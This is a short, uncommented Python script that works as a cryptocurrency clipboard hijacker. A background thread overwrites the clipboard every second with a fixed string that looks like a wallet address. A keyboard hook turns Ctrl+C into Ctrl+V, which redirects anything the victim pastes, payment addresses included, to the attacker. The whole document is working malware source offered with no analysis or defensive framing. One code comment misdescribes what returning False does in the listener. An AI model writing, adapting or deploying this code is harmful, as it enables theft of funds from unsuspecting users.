from pynput import keyboard
import pyperclip
import time
from threading import Thread


def clipboard_monitor():
    while True:
        if pyperclip.paste() != "F8YxQZcmbkWfJPwCD15Z3CUWub8cKTsxvGYKhmLE3mEX":
            pyperclip.copy("F8YxQZcmbkWfJPwCD15Z3CUWub8cKTsxvGYKhmLE3mEX")
        time.sleep(1)  # Check every second


def on_press(key):
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            global ctrl_pressed
            ctrl_pressed = True
        elif key == keyboard.KeyCode.from_char('c') and ctrl_pressed:
            with keyboard.Controller() as controller:
                controller.press(keyboard.Key.ctrl)
                controller.tap('v')
                controller.release(keyboard.Key.ctrl)
            return False  # Stop propagation of the original Ctrl + C
    except AttributeError:
        pass

def on_release(key):
    global ctrl_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False

# Start clipboard monitor in a separate thread
clipboard_thread = Thread(target=clipboard_monitor)
clipboard_thread.daemon = True
clipboard_thread.start()

# Start keyboard listener
ctrl_pressed = False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

